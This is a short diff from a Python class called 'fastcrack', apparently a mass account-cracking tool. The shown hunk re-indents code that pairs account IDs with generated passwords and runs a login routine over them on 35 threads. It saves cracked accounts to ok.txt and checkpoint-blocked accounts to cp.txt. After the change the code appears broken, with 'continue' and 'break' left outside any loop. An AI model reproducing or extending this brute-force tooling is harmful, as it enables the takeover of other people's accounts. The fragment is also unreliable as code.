@@ -478,20 +478,21 @@ class fastcrack:
 			except Exception as e:
 				print ("   %s"%e)
 				continue
-					self.fl=[]
-					for i in self.fs:
-						try:
-							self.fl.append({"id":i.split("<=>")[0],"pw":gene(i.split("<=>")[1])})
-						except:continue
-				except Exception as e:
-					print ("   %s"%e)
-			print ("   [•] Crack Started...")
-			print ("   [•] Account [OK] Saved to : ok.txt")
-			print ("   [•] Account [CP] Saved to : cp.txt\n")
-			ThreadPool(35).map(self.main1,self.fl)
-			os.remove(self.apk)
-			print("\n\x1b[0;37m   [•] Finished")
-			break
+		self.fl=[]
+		for i in self.fs:
+			try:
+				self.fl.append({"id":i.split("<=>")[0],"pw":gene(i.split("<=>")[1])})
+			except:continue
+	except Exception as e:
+		print ("   %s"%e)
+		continue
+	print ("   [•] Crack Started...")
+	print ("   [•] Account [OK] Saved to : ok.txt")
+	print ("   [•] Account [CP] Saved to : cp.txt\n")
+	ThreadPool(35).map(self.main1,self.fl)
+	os.remove(self.apk)
+	print("\n\x1b[0;37m   [•] Finished")
+	break
 			
 def main1(self,fl):
 		try:
